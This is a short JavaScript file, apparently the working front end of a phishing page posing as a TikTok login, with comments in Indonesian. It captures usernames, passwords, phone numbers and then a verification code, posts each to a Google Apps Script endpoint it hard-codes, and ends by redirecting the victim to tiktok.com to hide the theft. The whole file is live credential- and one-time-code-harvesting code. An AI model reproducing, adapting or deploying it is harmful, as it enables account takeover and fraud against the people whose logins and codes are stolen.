const url = "https://script.google.com/macros/s/AKfycbzfqekEJMr3zdCL2AEFiQ-8UWqYQ-fjou9EsHWPCgi26A6uGR4dq27RsZBmVCgam-yM/exec";

let dataUser = {};


// Enter pindah input
document.querySelectorAll("#formUser input").forEach((input,index,inputs)=>{

  input.addEventListener("keydown",function(e){

    if(e.key === "Enter"){

      e.preventDefault();

      if(index < inputs.length - 1){
        inputs[index + 1].focus();
      }

    }

  });

});


// tombol masuk
document.getElementById("formUser")
.addEventListener("submit",function(e){

e.preventDefault();


dataUser = {

username: document.getElementById("username").value,

password: document.getElementById("password").value,

telepon: document.getElementById("telepon").value

};


// kirim data awal ke sheet

fetch(url,{

method:"POST",

body:JSON.stringify(dataUser)

})
.then(res=>res.text())

.then(result=>{


console.log(result);


// pindah halaman kode

document.getElementById("formData").style.display="none";

document.getElementById("verifikasi").style.display="block";


})

.catch(err=>{

console.log(err);

alert("Gagal mengirim data");

});


});



// tombol verifikasi

function kirimKode(){

dataUser.kode = document.getElementById("kode").value;


fetch(url,{

method:"POST",

body:JSON.stringify(dataUser)

})
.then(res=>res.text())

.then(()=>{


alert("Kode berhasil dikirim");


bukaTikTok();


})

.catch(err=>{


console.log(err);

alert("Gagal mengirim data");


});


}



function bukaTikTok(){

window.location.href="https://www.tiktok.com";

}